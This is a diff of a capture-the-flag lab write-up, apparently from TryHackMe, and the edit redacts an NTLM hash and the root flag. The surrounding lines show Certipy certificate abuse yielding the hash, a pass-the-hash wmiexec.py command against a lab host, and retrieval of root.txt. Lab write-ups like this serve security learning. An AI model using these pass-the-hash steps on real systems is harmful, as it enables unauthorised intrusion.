@@ -166,7 +166,7 @@ Since **SUSANNA_MCKNIGHT** had RDP permissions, I attempted to connect to the ta
 
 On the desktop, I found a text file containing the **user flag**.
 
-![](/assets/image/ledger/user%20flag.png)
+![](/assets/image/ledger/userflag.png)
 
 ## Post-Exploitation Enumeration
 
@@ -324,7 +324,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'bradley_ortiz.ccache'
 [*] Wrote credential cache to 'bradley_ortiz.ccache'
 [*] Trying to retrieve NT hash for 'bradley_ortiz'
-[*] Got hash for 'bradley_ortiz@thm.local': aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
+[*] Got hash for 'bradley_ortiz@thm.local': [HASH REDACTED]
 ```
 
 After successfully requesting the certificate, I used it to authenticate as **BRADLEY_ORTIZ** using `certipy-ad auth`. The authentication was successful, and Certipy was able to obtain the **NTLM hash** for for **BRADLEY_ORTIZ** . 
@@ -336,7 +336,7 @@ After successfully retrieving the NTLM hash for **BRADLEY_ORTIZ**, I used **Pass
 The Last step was navigating to the Administrator’s desktop and retrieving the **root flag**.
 
 ```
-❯ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d THM.LOCAL/bradley_ortiz@10.49.135.148
+❯ wmiexec.py -hashes [HASH REDACTED] THM.LOCAL/bradley_ortiz@10.49.135.148
 
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -347,7 +347,7 @@ C:\>whoami
 thm\bradley_ortiz
 
 C:\>type C:\Users\Administrator\Desktop\root.txt
-THM{THE_BYPASS_IS_C********}
+THM{T**_B*****_I*_C********}
 C:\>[-] 
 
 ```
